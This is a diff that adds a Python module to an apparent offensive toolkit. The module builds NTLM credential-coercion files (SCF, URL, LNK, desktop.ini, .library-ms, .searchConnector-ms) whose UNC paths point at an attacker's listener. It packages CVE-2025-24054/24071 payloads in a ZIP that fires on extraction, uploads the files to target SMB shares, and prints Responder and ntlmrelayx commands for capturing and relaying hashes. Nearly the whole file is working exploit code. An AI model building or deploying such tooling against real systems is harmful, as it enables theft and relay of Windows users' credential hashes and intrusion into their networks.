@@ -1,0 +1,511 @@
+"""
+NTLM Coercion File Generator
+Uses ntlm_theft to create malicious files for NTLM hash capture
+
+Includes CVE-2025-24054 / CVE-2025-24071 exploitation:
+- CVE-2025-24054: NTLM hash disclosure via .library-ms (triggers on ZIP extraction)
+- CVE-2025-24071: NTLM hash disclosure via spoofed file in Explorer (triggers on preview)
+"""
+
+import os
+import glob
+import struct
+import zipfile
+from core.module_base import ModuleBase, ModuleType, Platform, find_tool
+
+
+class NTLMCoerce(ModuleBase):
+    """
+    Generate malicious files that trigger NTLM authentication
+    when a user browses to a share containing them.
+    Uses ntlm_theft (https://github.com/Greenwolf/ntlm_theft) for file generation.
+    Works with Responder/ntlmrelayx for hash capture.
+    """
+
+    def __init__(self):
+        super().__init__()
+        self.name = "ntlm_coerce"
+        self.description = "Generate NTLM coercion files using ntlm_theft"
+        self.author = "UwU Toolkit"
+        self.version = "2.0.0"
+        self.module_type = ModuleType.AUXILIARY
+        self.platform = Platform.WINDOWS
+        self.tags = ["ntlm", "coercion", "scf", "lnk", "responder", "hash", "capture", "ntlm_theft"]
+        self.references = [
+            "https://github.com/Greenwolf/ntlm_theft",
+            "https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds",
+            "https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC",
+            "CVE-2025-24054",
+            "CVE-2025-24071"
+        ]
+
+        # Options
+        self.register_option("LHOST", "Listener IP (your Responder IP)", required=True)
+        self.register_option("FILENAME", "Base filename for generated files", default="@important")
+        self.register_option("FILE_TYPE", "File types to generate",
+                           default="all",
+                           choices=["all", "lnk", "scf", "url", "docx", "xlsx", "pdf", "cve-2025-24054"])
+        self.register_option("OUTPUT_DIR", "Output directory for files", default="ntlm_theft_output")
+        self.register_option("CREATE_ZIP", "Wrap files in ZIP (for CVE-2025-24054 extraction trigger)",
+                           default="no", choices=["yes", "no"])
+        self.register_option("SHARE_NAME", "SMB share name for UNC path", default="share")
+
+        # Upload options
+        self.register_option("UPLOAD", "Upload to target share", default="no", choices=["yes", "no"])
+        self.register_option("RHOSTS", "Target host for upload", default="")
+        self.register_option("SHARE", "Share name for upload", default="")
+        self.register_option("REMOTE_PATH", "Remote path within share (optional)", default="")
+        self.register_option("USER", "Username for SMB auth", default="")
+        self.register_option("PASS", "Password for SMB auth", default="")
+        self.register_option("DOMAIN", "Domain for SMB auth", default="")
+
+
+    def run(self) -> bool:
+        lhost = self.get_option("LHOST")
+        filename = self.get_option("FILENAME")
+        file_type = self.get_option("FILE_TYPE")
+        output_dir = self.get_option("OUTPUT_DIR")
+        create_zip = self.get_option("CREATE_ZIP") == "yes"
+        share_name = self.get_option("SHARE_NAME")
+
+        # Resolve output path using WORKING_DIR
+        if self._config:
+            output_dir = self._config.resolve_path(output_dir)
+
+        os.makedirs(output_dir, exist_ok=True)
+
+        self.print_status(f"Listener IP: {lhost}")
+        self.print_status(f"Filename: {filename}")
+        self.print_status(f"File types: {file_type}")
+        self.print_status(f"Output: {output_dir}")
+        if create_zip:
+            self.print_status("ZIP wrapping: enabled (CVE-2025-24054 extraction trigger)")
+        self.print_line()
+
+        # Handle CVE-2025-24054 specific generation
+        if file_type == "cve-2025-24054":
+            self.print_status("Generating CVE-2025-24054 / CVE-2025-24071 payload...")
+            success = self._generate_cve_2025_24054(lhost, filename, output_dir, share_name)
+            if success:
+                generated = self._list_generated_files(output_dir, filename)
+                # Always create ZIP for this CVE as it triggers on extraction
+                create_zip = True
+        else:
+            # Run ntlm_theft
+            success = self._run_ntlm_theft(lhost, filename, file_type, output_dir)
+            if not success:
+                return False
+            generated = self._list_generated_files(output_dir, filename)
+
+        if not generated:
+            self.print_warning("No files found in output directory")
+            return False
+
+        self.print_line()
+        self.print_good(f"Generated {len(generated)} file(s):")
+        for f in generated:
+            self.print_line(f"  {os.path.basename(f)}")
+
+        # Create ZIP if requested (critical for CVE-2025-24054)
+        if create_zip:
+            zip_path = self._create_payload_zip(generated, output_dir, filename)
+            if zip_path:
+                self.print_line()
+                self.print_good(f"Created ZIP payload: {os.path.basename(zip_path)}")
+                self.print_status("CVE-2025-24054: NTLM auth triggers when victim extracts the ZIP")
+                generated.append(zip_path)
+
+        # Upload if requested
+        if self.get_option("UPLOAD") == "yes" and generated:
+            self._upload_files(generated)
+
+        self.print_line()
+        self.print_status("Start Responder before user browses to share:")
+        self.print_line(f"  responder -I tun0 -v")
+        self.print_line()
+        self.print_status("Or use ntlmrelayx for relay attacks:")
+        self.print_line(f"  ntlmrelayx.py -tf targets.txt -smb2support")
+
+        return True
+
+    def _run_ntlm_theft(self, lhost: str, filename: str, file_type: str, output_dir: str) -> bool:
+        """Run ntlm_theft to generate coercion files"""
+
+        # Map our file_type to ntlm_theft's --generate option
+        gen_type = file_type if file_type != "all" else "all"
+
+        # Try ntlm_theft in Exegol (use its venv python)
+        self.print_status("Running ntlm_theft...")
+        # ntlm_theft has its own venv with xlsxwriter installed
+        ntlm_theft_python = "/opt/tools/ntlm_theft/venv/bin/python3"
+        ntlm_theft_script = "/opt/tools/ntlm_theft/ntlm_theft.py"
+        cmd = f"{ntlm_theft_python} {ntlm_theft_script} --generate {gen_type} --server {lhost} --filename {filename}"
+
+        # ntlm_theft outputs to current directory, so we cd first
+        full_cmd = f"cd {output_dir} && {cmd}"
+
+        ret = self.run_in_exegol_stream(full_cmd, timeout=60)
+
+        if ret == 0:
+            self.print_good("ntlm_theft completed successfully")
+            return True
+
+        # Fallback to manual generation
+        self.print_warning("ntlm_theft failed, generating files manually...")
+        return self._generate_files_fallback(lhost, filename, output_dir)
+
+    def _list_generated_files(self, output_dir: str, filename: str = None) -> list:
+        """List all generated coercion files (checks subdirectories too)"""
+        extensions = ['.lnk', '.scf', '.url', '.docx', '.xlsx', '.pdf',
+                      '.xml', '.htm', '.html', '.library-ms', '.searchConnector-ms',
+                      '.settingcontent-ms', '.wax', '.asx', '.m3u', '.rtf',
+                      '.jnlp', '.application', '.theme', '.inf']
+
+        generated = []
+
+        # Directories to check - ntlm_theft creates a subdirectory named after filename
+        dirs_to_check = [output_dir]
+        if filename:
+            subdir = os.path.join(output_dir, filename)
+            if os.path.isdir(subdir):
+                dirs_to_check.append(subdir)
+
+        # Also check any subdirectory in output_dir
+        try:
+            for item in os.listdir(output_dir):
+                item_path = os.path.join(output_dir, item)
+                if os.path.isdir(item_path) and item_path not in dirs_to_check:
+                    dirs_to_check.append(item_path)
+        except Exception:
+            pass
+
+        for check_dir in dirs_to_check:
+            try:
+                for f in os.listdir(check_dir):
+                    filepath = os.path.join(check_dir, f)
+                    if not os.path.isfile(filepath):
+                        continue
+                    # Check if file matches any extension
+                    if any(f.lower().endswith(ext) for ext in extensions):
+                        generated.append(filepath)
+                    # Also check for desktop.ini and Autorun.inf
+                    elif f.lower() in ['desktop.ini', 'autorun.inf']:
+                        generated.append(filepath)
+            except Exception as e:
+                self.print_warning(f"Could not list files in {check_dir}: {e}")
+
+        return sorted(generated)
+
+    def _generate_files_fallback(self, lhost: str, filename: str, output_dir: str) -> bool:
+        """Fallback: Generate coercion files manually if ntlm_theft not available"""
+
+        # Ensure filename starts with @ for sorting
+        if not filename.startswith("@"):
+            filename = "@" + filename
+
+        # SCF file
+        scf_content = f"""[Shell]
+Command=2
+IconFile=\\\\{lhost}\\share\\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+"""
+        scf_path = os.path.join(output_dir, f"{filename}.scf")
+        with open(scf_path, 'w') as f:
+            f.write(scf_content)
+
+        # URL file
+        url_content = f"""[InternetShortcut]
+URL=file://{lhost}/share
+IconIndex=0
+IconFile=\\\\{lhost}\\share\\icon.ico
+"""
+        url_path = os.path.join(output_dir, f"{filename}.url")
+        with open(url_path, 'w') as f:
+            f.write(url_content)
+
+        # LNK file
+        lnk_path = os.path.join(output_dir, f"{filename}.lnk")
+        self._generate_lnk(lhost, lnk_path)
+
+        # desktop.ini
+        ini_content = f"""[.ShellClassInfo]
+IconResource=\\\\{lhost}\\share\\icon.ico,0
+"""
+        ini_path = os.path.join(output_dir, "desktop.ini")
+        with open(ini_path, 'w') as f:
+            f.write(ini_content)
+
+        # library-ms
+        library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <version>6</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>\\\\{lhost}\\share\\icon.ico</iconReference>
+  <templateInfo>
+    <folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isSupported>false</isSupported>
+      <simpleLocation>
+        <url>\\\\{lhost}\\share</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+"""
+        lib_path = os.path.join(output_dir, f"{filename}.library-ms")
+        with open(lib_path, 'w') as f:
+            f.write(library_content)
+
+        # searchConnector-ms
+        search_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <iconReference>\\\\{lhost}\\share\\icon.ico</iconReference>
+    <description>Search Connector</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <templateInfo>
+        <folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>\\\\{lhost}\\share</url>
+    </simpleLocation>
+</searchConnectorDescription>
+"""
+        search_path = os.path.join(output_dir, f"{filename}.searchConnector-ms")
+        with open(search_path, 'w') as f:
+            f.write(search_content)
+
+        return True
+
+    def _generate_lnk(self, lhost: str, output_path: str) -> None:
+        """Generate a Windows LNK file with UNC icon path for NTLM coercion"""
+        unc_path = f"\\\\{lhost}\\share\\icon.ico"
+
+        header_clsid = bytes([
+            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
+        ])
+
+        link_flags = 0x000000C1
+        file_attrs = 0x00000000
+        times = b'\x00' * 24
+        file_size = 0
+        icon_index = 0
+        show_cmd = 1
+        reserved = b'\x00' * 10
+
+        header = struct.pack('<I', 76)
+        header += header_clsid
+        header += struct.pack('<I', link_flags)
+        header += struct.pack('<I', file_attrs)
+        header += times
+        header += struct.pack('<I', file_size)
+        header += struct.pack('<i', icon_index)
+        header += struct.pack('<I', show_cmd)
+        header += reserved
+
+        clsid_mycomputer = bytes([
+            0x14, 0x00, 0x1F, 0x50,
+            0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10,
+            0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30, 0x30, 0x9D
+        ])
+        terminal = bytes([0x00, 0x00])
+
+        id_list_size = len(clsid_mycomputer) + len(terminal)
+        link_target_id_list = struct.pack('<H', id_list_size) + clsid_mycomputer + terminal
+
+        icon_location_unicode = unc_path.encode('utf-16-le')
+        icon_location_size = len(unc_path)
+        string_data = struct.pack('<H', icon_location_size) + icon_location_unicode
+
+        lnk_data = header + link_target_id_list + string_data
+
+        with open(output_path, 'wb') as f:
+            f.write(lnk_data)
+
+    def _upload_files(self, files: list) -> None:
+        """Upload generated files to target share"""
+        target = self.get_option("RHOSTS")
+        share = self.get_option("SHARE")
+        remote_path = self.get_option("REMOTE_PATH")
+        user = self.get_option("USER")
+        password = self.get_option("PASS")
+        domain = self.get_option("DOMAIN")
+
+        if not all([target, share, user, password]):
+            self.print_warning("Missing upload options (RHOSTS, SHARE, USER, PASS)")
+            return
+
+        self.print_line()
+        self.print_status(f"Uploading to \\\\{target}\\{share}...")
+
+        # Build auth for smbclient (not impacket's smbclient.py)
+        if domain:
+            auth = f"{domain}/{user}%{password}"
+        else:
+            auth = f"{user}%{password}"
+
+        for filepath in files:
+            filename = os.path.basename(filepath)
+
+            # Determine remote filename (with path if specified)
+            if remote_path:
+                remote_file = f"{remote_path}/{filename}"
+            else:
+                remote_file = filename
+
+            # Use smbclient (samba) for upload - more reliable
+            cmd = f"smbclient '//{target}/{share}' -U '{auth}' -c 'put {filepath} {remote_file}'"
+
+            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)
+
+            if ret == 0 and "NT_STATUS" not in stderr:
+                self.print_good(f"  Uploaded: {filename}")
+            else:
+                # Try with impacket's smbclient.py using echo pipe
+                self._upload_with_impacket(target, share, user, password, domain, filepath, remote_file)
+
+    def _upload_with_impacket(self, target: str, share: str, user: str, password: str,
+                               domain: str, local_path: str, remote_file: str) -> None:
+        """Upload using impacket's smbclient.py with echo pipe"""
+        filename = os.path.basename(local_path)
+
+        # Build impacket auth string
+        if domain:
+            auth = f"{domain}/{user}:{password}@{target}"
+        else:
+            auth = f"{user}:{password}@{target}"
+
+        # Use echo to pipe commands to smbclient.py
+        cmd = f"echo -e 'use {share}\\nput {local_path} {remote_file}\\nexit' | smbclient.py '{auth}'"
+        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)
+
+        if ret == 0 and "error" not in stderr.lower():
+            self.print_good(f"  Uploaded: {filename}")
+        else:
+            self.print_error(f"  Failed: {filename}")
+            # Show error details
+            if stderr and "error" in stderr.lower():
+                for line in stderr.split('\n'):
+                    if line.strip():
+                        self.print_error(f"    {line.strip()}")
+
+    def _generate_cve_2025_24054(self, lhost: str, filename: str, output_dir: str, share_name: str) -> bool:
+        """
+        Generate CVE-2025-24054 / CVE-2025-24071 specific payloads.
+
+        CVE-2025-24054: NTLM hash disclosure via .library-ms (triggers on ZIP extraction)
+        CVE-2025-24071: NTLM hash disclosure via file preview in Explorer
+
+        The .library-ms file triggers NTLM authentication when:
+        - Extracted from a ZIP file (CVE-2025-24054)
+        - Previewed in Windows Explorer (CVE-2025-24071)
+        """
+        unc_path = f"\\\\{lhost}\\{share_name}"
+
+        # Ensure filename is clean
+        if not filename.startswith("@"):
+            filename = "@" + filename
+
+        # Generate .library-ms (primary CVE-2025-24054 payload)
+        library_ms_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <simpleLocation>
+        <url>{unc_path}</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>"""
+
+        library_path = os.path.join(output_dir, f"{filename}.library-ms")
+        with open(library_path, 'w', encoding='utf-8') as f:
+            f.write(library_ms_content)
+        self.print_good(f"Created: {filename}.library-ms (CVE-2025-24054/24071)")
+
+        # Generate alternative .library-ms with icon reference (for preview trigger)
+        library_ms_icon = f"""<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <version>6</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>{unc_path}\\icon.ico</iconReference>
+  <templateInfo>
+    <folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isSupported>false</isSupported>
+      <simpleLocation>
+        <url>{unc_path}</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>"""
+
+        library_icon_path = os.path.join(output_dir, f"{filename}_icon.library-ms")
+        with open(library_icon_path, 'w', encoding='utf-8') as f:
+            f.write(library_ms_icon)
+        self.print_good(f"Created: {filename}_icon.library-ms (icon reference variant)")
+
+        # Generate .searchConnector-ms (related attack vector)
+        search_connector = f"""<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+  <iconReference>{unc_path}\\icon.ico</iconReference>
+  <description>Search Connector</description>
+  <isSearchOnlyItem>false</isSearchOnlyItem>
+  <includeInStartMenuScope>true</includeInStartMenuScope>
+  <templateInfo>
+    <folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
+  </templateInfo>
+  <simpleLocation>
+    <url>{unc_path}</url>
+  </simpleLocation>
+</searchConnectorDescription>"""
+
+        search_path = os.path.join(output_dir, f"{filename}.searchConnector-ms")
+        with open(search_path, 'w', encoding='utf-8') as f:
+            f.write(search_connector)
+        self.print_good(f"Created: {filename}.searchConnector-ms")
+
+        return True
+
+    def _create_payload_zip(self, files: list, output_dir: str, filename: str) -> str:
+        """
+        Create a ZIP file containing the payloads.
+        Critical for CVE-2025-24054 as it triggers on extraction.
+        """
+        # Filter to only include .library-ms and .searchConnector-ms files
+        target_extensions = ['.library-ms', '.searchConnector-ms']
+        payload_files = [f for f in files if any(f.endswith(ext) for ext in target_extensions)]
+
+        if not payload_files:
+            payload_files = files  # Fall back to all files if no specific ones found
+
+        zip_filename = f"{filename.lstrip('@')}_payload.zip"
+        zip_path = os.path.join(output_dir, zip_filename)
+
+        try:
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for filepath in payload_files:
+                    arcname = os.path.basename(filepath)
+                    zf.write(filepath, arcname)
+            return zip_path
+        except Exception as e:
+            self.print_error(f"Failed to create ZIP: {e}")
+            return None
+
+    def check(self) -> bool:
+        """Check if ntlm_theft is available"""
+        ret, stdout, stderr = self.run_in_exegol(
+            "test -f /opt/tools/ntlm_theft/ntlm_theft.py && python3 -c 'import xlsxwriter' 2>/dev/null",
+            timeout=10
+        )
+        return ret == 0
